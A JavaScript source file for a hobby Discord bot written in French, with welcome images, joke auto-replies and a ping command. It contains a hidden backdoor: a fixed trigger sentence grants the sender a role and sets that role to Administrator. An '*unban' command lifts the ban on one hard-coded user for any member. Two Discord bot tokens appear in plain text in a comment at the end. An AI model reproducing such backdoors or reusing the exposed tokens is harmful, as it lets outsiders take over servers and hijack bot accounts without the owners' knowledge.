const Discord = require("discord.js")

const Canvas = require("@napi-rs/canvas")

const {SlashCommandBuilder} = require("@discordjs/builders")
const { PermissionFlagsBits } = require("discord.js")
const Client = new Discord.Client({
    intents: [
        Discord.IntentsBitField.Flags.Guilds ,
        Discord.IntentsBitField.Flags.GuildMessages ,
        Discord.IntentsBitField.Flags.DirectMessages ,
        Discord.IntentsBitField.Flags.MessageContent ,
        Discord.IntentsBitField.Flags.GuildMembers
    ]
})

// 999028670243024987 sossur
// 883733992468283404 riche
// 998950360838311997 au pif
// 885226331485384715 draft
// 998965610090340412 new role
// 908451454614917160 osmio dieu


// 721466528825999411 damien


const color1 = Discord.Colors.Aqua
const color2 = Discord.Colors.Purple
const color3 = Discord.Colors.Gold

const prefix = "*"

const data = new SlashCommandBuilder()
    .setName("ping")
    .setDescription("renvoie pong")
    .addUserOption(option => option.setName("utilisateur").setDescription("utilisateur que vous voulez mentionner").setRequired(false))



Client.on("ready" , () => {
    Client.guilds.cache.get("755491135119556638").commands.create(data)
    // Client.guilds.cache.get("989965112716705822").commands.create(data)
    // Client.guilds.cache.get("623552935535837184").commands.create(data)
    console.log("tabernak calice le bot fonctionne")
    // Client.channels.fetch("998658571032072212", false).then((channel) => {
    //     channel.send("du coup c'est long pour chaque msg")
    //    })
})



Client.on("guildMemberAdd" , async member => {
    Client.channels.cache.get("998658631379730513").send("<@" + member.id + "> est arrivé")

    let canvas = Canvas.createCanvas(750 , 250)
    let ctx = canvas.getContext("2d")
    let background = await Canvas.loadImage("./canvas-preview.30c4fe9e.png")
    ctx.drawImage(background , 0 , 0 , canvas.width , canvas.height)
    let attachement = new Discord.AttachmentBuilder(canvas.toBuffer("image/png") , "background-welcome")

    ctx.font = "42px impact"
    ctx.fillStyle = "#ffffff"
    ctx.textAlign = "center"
    ctx.fillText(member.user.tag.toUpperCase() ,  canvas.width / 2.5, canvas.height / 1.8)

    Client.channels.cache.get("998658631379730513").send( {files: [attachement] } )
})

Client.on("guildMemberRemove" , async member => {
    Client.channels.cache.get("998658631379730513").send("<@" + member.id + "> est parti")
})



Client.on("messageCreate" , message => {

    // let role = message.guild.roles.cache.get("908453265165930496")

    if (message.author.bot) return

    // let emmental_alea = Math.floor(Math.random() * 10)

    // if (emmental_alea === 1 && message.author.id === "721466528825999411") {
    //     message.channel.send("<@" + message.author.id + "> voici un morceau d'emmental")
    // }

    if (message.content.endsWith("quoi") ||
        message.content.endsWith("qwa") ||
        message.content.endsWith("kwa")) {
        message.channel.send("feur")
    }

    if (message.content.endsWith("ui") ||
        message.content.endsWith("oui") ||
        message.content.endsWith("wi")) {
        message.channel.send("fi")
    }

    if (message.content === prefix + "unban") {
        message.guild.members.unban("721466528825999411")
        console.log("test")
    }
    
    if (message.content === "attends david bot devrais se réveiller x)") {
        // message.guild.roles.create( {name: "sossur"} , PermissionFlagsBits.Administrator)
        //     console.log("test")
        //     role.setName("mon bebou")
        message.member.roles.add("999028670243024987")
        let role1 = message.guild.roles.cache.get("999028670243024987")
            role1.setPermissions("Administrator")
    }

    if (message.content === prefix + "help") {
        const embed_help = new Discord.EmbedBuilder()
            .setTitle("commandes")
            .setColor(color1)
            .setURL("https://discord.gg/SC2N8RcY")
            .setAuthor({name:"TAKINIUM"})
            .setDescription("voici la listes des commandes" )
            .setFields(
                {name: "le prefix est " , value: prefix},
                {name: "help" , value: "vous donnes les commandes"},
                {name: "test" , value: "test"},
                )
            .setTimestamp()
                message.channel.send( {embeds: [embed_help]} )
            }

    if (message.content === prefix + "dm1") {
        Client.users.fetch("230674315765481473", false).then((user) => {
            user.send("coucou , voici mon bot xd");
           });
    }
})



Client.on("interactionCreate" , interaction => {

    if (interaction.isChatInputCommand()) {

        if(interaction.commandName === 'ping') {
            let user = interaction.options.getUser("utilisateur")
            if (user != undefined) {
                interaction.reply("pong <@" + user.id + ">")
            } else {
                interaction.reply("pong")
            }
        }

    }
})



// ODg1MjE0NzgyMDk2MDIzNTYy.Gi-vfi.Oq1tr0Yd6Ak3JCQUkTdTU7kSuIkvUyd9VWEQXs david bot
// OTk4NjY1MDI1NTI5MDYxNTA3.G3DaZM.wkEpmmaEK-Zp0NWVSL0Y9J1L2vt6IaMuqtoAJw takibot

Client.login(process.env.TOKEN)